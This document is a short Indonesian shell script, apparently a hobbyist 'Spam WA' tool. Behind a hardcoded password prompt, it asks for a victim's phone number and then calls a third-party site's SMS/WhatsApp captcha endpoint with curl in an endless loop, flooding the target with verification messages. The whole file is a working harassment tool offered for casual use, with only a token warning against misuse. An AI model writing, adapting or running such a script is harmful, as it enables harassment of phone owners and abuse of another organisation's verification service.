#/bin/sh
clear
echo "\033[1;37m"
figlet "Gx Priv Tools"
sleep 1
echo "Login dulu su"
echo "================="
read -p "masukan nick :" nick
pass="gxtteam"
until [ "$passw" = "$pass" ]
do
  read -p "masukan password : " passw
done
clear
echo "password yang kamu masukan benar"
sleep 1
echo "selamat datang di GXT tools $nick"
clear
figlet "Spam WA "
echo "\033[1;32m ==============================================="
echo "Masukan Nomor Target Tanpa 62/0 ya su :v "
echo " ==============================================="
echo "Contoh : 821xxxxxxnxx"
sleep 1
echo "jangan salahgunakan Tools ini"
sleep 1
echo " kalo gabut gpp hehe :v"
echo "\033[1;37m"
read -p " root@$nick:~# " num
while [ ON ]
do
url=$(curl -s "https://passport.pedulisehat.id/v2/sms/captcha?mobile=$num&mobile_country_code=62&channel=WhatsApp&_=1591007074597" | grep -o "more_info")
if [[ $url == "more_info" ]]
then
echo "Nomor : $num - Statut : Sukses!"
fi
done
